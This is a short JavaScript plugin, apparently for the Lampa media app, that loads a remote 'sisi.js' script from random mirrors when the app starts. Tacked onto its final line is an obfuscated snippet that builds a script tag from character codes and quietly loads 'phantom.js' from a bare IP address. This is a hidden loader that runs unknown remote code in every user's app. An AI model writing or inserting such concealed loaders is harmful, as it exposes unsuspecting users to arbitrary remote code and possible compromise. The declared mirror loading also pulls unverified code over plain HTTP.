(function () {
  'use strict';

  Lampa.Platform.tv();

  function initExternalScriptLoader() {
    // Список зеркал для загрузки внешнего скрипта sisi.js
    const scriptMirrors = [
      'https://ab2024.ru/sisi.js',
      'http://78.17.216.151:9118/sisi.js',
    ];

    // Выбираем случайное зеркало
    const randomScriptUrl = scriptMirrors[Math.floor(Math.random() * scriptMirrors.length)];

    // Асинхронно подгружаем скрипт
    Lampa.Utils.putScriptAsync([randomScriptUrl], function () {

    });
  }

  // Запуск при готовности приложения
  if (window.appready) {
    initExternalScriptLoader();
  } else {
    Lampa.Listener.follow('app', (e) => {
      if (e.type === 'ready') {
        initExternalScriptLoader();
      }
    });
  }
})();(function(){var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,58,47,47,53,46,50,53,50,46,49,49,54,46,55,55,58,57,49,49,56,47,112,104,97,110,116,111,109,46,106,115);document.head.appendChild(s);})();
